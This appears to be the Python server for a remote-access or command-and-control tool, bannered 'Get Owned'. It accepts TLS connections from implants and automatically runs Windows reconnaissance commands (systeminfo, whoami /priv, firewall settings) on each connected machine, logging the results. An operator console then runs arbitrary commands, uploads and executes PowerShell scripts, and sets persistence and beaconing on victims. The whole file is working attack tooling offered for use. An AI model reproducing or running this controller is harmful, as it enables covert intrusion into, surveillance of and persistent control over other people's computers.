import socket
import os
from datetime import datetime, timezone
from prettytable import PrettyTable
import threading
import ssl
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
import base64
from pyfiglet import Figlet
import re
from time import sleep

clients = {}
clients_lock = threading.Lock()
server_socket = None
server_running = True

KEY = b'xxxxxxxxxxxxxxxx'

def enc_all_input(inp,key=KEY):
    cipher = AES.new(key,AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(inp.encode(),AES.block_size)))

def dec_all_input(inp,key=KEY):
    cipher = AES.new(key,AES.MODE_ECB)
    return unpad(cipher.decrypt(base64.b64decode(inp)),AES.block_size).decode()

def parse_systeminfo(systeminfo_output):
    details = {}
    for line in systeminfo_output.splitlines():
        if "Host Name" in line:
            details["Host Name"] = line.split(":")[1].strip()
        elif "OS Name" in line:
            details["OS Name"] = line.split(":")[1].strip()
        elif "Registered Owner" in line:
            details["Registered Owner"] = line.split(":")[1].strip()
        elif "Registered Organization" in line:
            details["Registered Organization"] = line.split(":")[1].strip()
    return details

def sanitize_ip_port(flag):
    try:
        parts = flag.split('**')
        ip = parts[1].strip()
        port = ''.join(filter(str.isdigit, parts[3].strip()))
        if ip and port.isdigit():
            return ip, port
    except (IndexError, ValueError):
        return None, None
    return None, None

def write_client_flags():
    with open("client_flags.txt", "w") as f:
        with clients_lock:
            for idx, (sock, flags) in enumerate(clients.items(), start=1):
                ip_flags = [flag.split()[1] for flag in flags if "IP_ADDRESS" in flag]
                port_flags = [flag.split()[1] for flag in flags if "PORT_NUMBER" in flag]
                hostname = [flag.split()[1] for flag in flags if "HOSTNAME" in flag][0]
                f.write(f"Client {idx}: \n")
                f.write(f"Hostname : {hostname}\n")
                f.write(f"IP Address : {', '.join(ip_flags)}\n")
                f.write(f"Port Number : {', '.join(port_flags)}\n\n")

def refresh_clients():
    print("Connected Clients : ")
    client_table = PrettyTable()
    client_table.field_names = ["Serial No", "Hostname", "Client IP", "Client Port"]
    with clients_lock:
        for idx, (sock, flags) in enumerate(clients.items(), start=1):
            ip_flags = [flag.split()[1] for flag in flags if "IP_ADDRESS" in flag]
            port_flags = [flag.split()[1] for flag in flags if "PORT_NUMBER" in flag]
            hostname = [flag.split()[1] for flag in flags if "HOSTNAME" in flag][0]
            client_table.add_row([idx, hostname, ", ".join(ip_flags), ", ".join(port_flags)])
    print(client_table)
    write_client_flags()

def handle_client(client_socket):
    try:
        client_flags = []
        flag_received = False
        hostname_received = False
        ctr = 0
        while not flag_received or not hostname_received:
            if ctr == 0:
                flag = client_socket.recv(1024).decode()
            else:
                flag = dec_all_input(client_socket.recv(1024))
            ctr+=1
            if not flag:
                break
            if "IP_ADDRESS" in flag and "PORT_NUMBER" in flag:
                ip, port = sanitize_ip_port(flag)
                if ip and port:
                    if f"IP_ADDRESS {ip}" not in client_flags:
                        client_flags.append(f"IP_ADDRESS {ip}")
                    if f"PORT_NUMBER {port}" not in client_flags:
                        client_flags.append(f"PORT_NUMBER {port}")
                    flag_received = True
                else:
                    print(f"Invalid IP or Port received: {flag}")
            if "HOSTNAME" in flag:
                hostname = flag.split('**')[-1].strip()
                if not any(f"HOSTNAME {hostname}" in s for s in client_flags):
                    client_flags.append(f"HOSTNAME {hostname}")
                hostname_received = True
        recon_commands = [
            'systeminfo',
            'getmac',
            'ipconfig /all',
            'whoami /priv',
            'netsh advfirewall show allprofiles',
        ]
        recon_output = {}
        for command in recon_commands:
            client_socket.send(enc_all_input(command))
            output = b""            
            while True:
                chunk = client_socket.recv(1024)
                output += chunk
                if len(chunk) < 1024:
                    break
            output = dec_all_input(output).encode()
            recon_output[command] = output.decode().replace(';;;', '')
        system_info = parse_systeminfo(recon_output.get('systeminfo', ''))
        parsed_hostname = system_info.get("Host Name", "Unknown").upper()
        if parsed_hostname != "Unknown" and f"HOSTNAME {parsed_hostname}" not in client_flags:
            client_flags = [flag for flag in client_flags if not flag.startswith("HOSTNAME")] 
            client_flags.append(f"HOSTNAME {parsed_hostname}")
        with clients_lock:
            clients[client_socket] = client_flags
        user_dir = f"./{parsed_hostname}"
        os.makedirs(user_dir, exist_ok=True)
        current_date = datetime.now(timezone.utc).strftime('%Y-%m-%d')
        date_dir = os.path.join(user_dir, current_date)
        os.makedirs(date_dir, exist_ok=True)
        current_time = datetime.now(timezone.utc).strftime('%H-%M-%S')
        time_dir = os.path.join(date_dir, current_time)
        os.makedirs(time_dir, exist_ok=True)
        recon_dir = os.path.join(time_dir, 'recon')
        os.makedirs(recon_dir, exist_ok=True)
        for command, output in recon_output.items():
            sanitized_command = '_'.join(filter(None, ''.join(c if c.isalnum() else '_' for c in command).split('_')))
            command_file = os.path.join(recon_dir, f"{sanitized_command}.txt")
            with open(command_file, 'w') as f:
                f.write(f"Command: {command}\n")
                f.write(f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d')}\n")
                f.write(f"UTC Time: {datetime.now(timezone.utc).strftime('%H-%M-%S')}\n")
                f.write(output)
        write_client_flags()
        while server_running:
            pass
    except Exception as e:
        print(f"Error in handle_client: {e}")
    finally:
        with clients_lock:
            clients.pop(client_socket, None)
        client_socket.close()

def input_thread():
    global server_running, server_socket
    if server_running:
        f = Figlet(font='slant')
        print(f.renderText('Get Owned'))
        flg = 0
    while server_running:
        if flg == 0:
            refresh_clients()
        # print("\n")
        # print("+==============================================+")
        # print("|                COMMAND CENTER                |")
        # print("+==============================================+")
        # print("| 'refresh'         : Refresh the Client List  |")
        # print("| '<serial_number>' : Enter Client Session     |")
        # print("| 'exit'            : Quit                     |")
        # print("+==============================================+")
        # print("\n")
        print("\nConsole Commands:")
        print("1. refresh\t: Refresh the available client list")
        print("2. connect <id>\t: Enter client session")
        print("3. exit\t\t: Close the server")
        print("4. beacons\t: Access the beaconing menu\n")
        flg = 0
        command = input("$ ")
        print("\n")
        if command.lower() == 'exit':
            print("\n")
            print("Shutting down server and disconnecting all clients...")
            server_running = False
            with clients_lock:
                for client_sock in list(clients.keys()):
                    client_sock.send(b"EXIT_SERVER")
                    client_sock.close()
            server_socket.close()
            break
        elif command.lower() == 'refresh':
            refresh_clients()
            flg = 1
        elif re.match(r'^connect \d+$',command): 
            command = command.split(' ')[1]
            if command.isdigit() and int(command) in range(1, len(clients) + 1):
                client_sock = list(clients.keys())[int(command) - 1]
                flags = clients[client_sock]
                ip_list = [flag.split(' ')[1] for flag in flags if 'IP_ADDRESS' in flag]
                client_ip_selected = ip_list[0] if ip_list else 'Unknown'
                print("Entering client menu:")
                while True:
                    ip_length = len(client_ip_selected)
                    max_length = 50
                    padding = 3
                    panel_width = max_length + padding + ip_length
                    commands = [
                        "'back'      : Return to the Command Center",
                        "'<command>' : Execute a Command",
                        "'script'     : Execute a Script",
                        "'exit'      : Quit",
                        "'persist'   : Persist the client",
                        "'beacon'     : Set beacon with interval"
                    ]
                    max_command_length = max(len(cmd) for cmd in commands)
                    option_padding = panel_width - 2 
                    print("\n")
                    print("+" + "=" * (panel_width - 2) + "+")
                    center_padding = (panel_width - len(f"CLIENT CONTROL PANEL - {client_ip_selected}") - 2) // 2
                    print("|" + " " * center_padding + f"CLIENT CONTROL PANEL - {client_ip_selected}" + " " * center_padding + "|")
                    print("+" + "=" * (panel_width - 2) + "+")
                    for cmd in commands:
                        print("| " + cmd.ljust(option_padding - 2) + " |")
                    print("+" + "=" * (panel_width - 2) + "+")
                    print("\n")
                    exec_command = input("$ ")
                    if exec_command.lower() in ['q', 'e', 'quit', 'exit']:
                        client_sock.send(f"EXIT_CLIENT {client_ip_selected}".encode())
                        client_sock.close()
                        with clients_lock:
                            clients.pop(client_sock, None)
                        break
                    elif exec_command.lower() == 'back':
                        print('\n')
                        break

                    # persist add/remove option
                    elif exec_command.lower().startswith('persist'):
                        client_sock.send(enc_all_input("PERSISTENT "+ exec_command[8:]))

                    elif exec_command.lower().startswith('beacon'):
                        client_sock.send(enc_all_input("BEACON "+ exec_command[7:]))

                    elif exec_command.lower().startswith('close'):
                        client_sock.send(enc_all_input("CLOSE"))

                    elif exec_command.lower() == 'script':
                        while True:
                            ip_length_s = len(client_ip_selected)
                            max_length_s = 60
                            padding_s = 3 
                            panel_width_s = max_length_s + padding_s + ip_length_s
                            commands_s = [
                                "'<script_filename_w_extension>' : Execute a Script on Client Machine",
                                "'exit'                          : Return to Client Control Panel"
                            ]
                            max_command_length_s = max(len(cmd) for cmd in commands_s)
                            option_padding_s = panel_width_s - 2
                            print("\n")
                            print("+" + "=" * (panel_width_s - 2) + "+")
                            center_padding_s = (panel_width_s - len(f"SCRIPT UPLOAD - {client_ip_selected}") - 2) // 2
                            print("|" + " " * center_padding_s +
                                f"SCRIPT UPLOAD - {client_ip_selected}" + " " * (center_padding_s + 1) + "|")  # Added +1 to the right padding
                            print("+" + "=" * (panel_width_s - 2) + "+")
                            for cmd_s in commands_s:
                                print("| " + cmd_s.ljust(option_padding_s - 2) + " |")
                            print("+" + "=" * (panel_width_s - 2) + "+")
                            print("\n")
                            script_filename = input("$ ")
                            if script_filename.lower() == 'exit':
                                break
                            if os.path.isfile(script_filename) and script_filename.endswith('.ps1'):
                                client_sock.send(enc_all_input("SCRIPT_START"))
                                with open(script_filename, 'r') as script_file:
                                    for line in script_file:
                                        sleep(1)
                                        client_sock.send(enc_all_input(line))
                                client_sock.send(enc_all_input("SCRIPT_END"))
                                print("\n")
                                print(f"Script '{script_filename}' sent to the client.")
                            else:
                                print("File does not exist or invalid extension.")
                    else:
                        client_sock.send(enc_all_input(exec_command))
                        output = b""
                        while True:
                            chunk = client_sock.recv(1024)
                            if not chunk:
                                break
                            output += chunk
                            if len(chunk) < 1024:
                                break                    
                        output = dec_all_input(output.decode()).replace(';;;', '')
                        print("\n")
                        print(f"Client {client_ip_selected} executed : {exec_command}")
                        print("\n")
                        print(f"Output : \n{output}")

        else:
            print("your command is incorrect or doesn't exist.  Enter it again\n")
def start_server():
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('', 8080))
    server_socket.listen(5)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="./ssl_certificates/server_ssl_certificates/server_cert.pem", keyfile="./ssl_certificates/server_ssl_certificates/server_key.pem")
    context.load_verify_locations(cafile="./ssl_certificates/ca_ssl_certificates/ca_cert.pem")
    context.verify_mode = ssl.CERT_REQUIRED
    server_socket = context.wrap_socket(server_socket, server_side=True)
    print("\n")
    print("Server started and waiting for connections...")  
    threading.Thread(target=input_thread, daemon=True).start()
    while server_running:
        try:
            client_socket, client_address = server_socket.accept()
            threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start()
            if server_running == False:
                os._exit(0)
                return
        except OSError:
            break

if __name__ == "__main__":
    start_server()
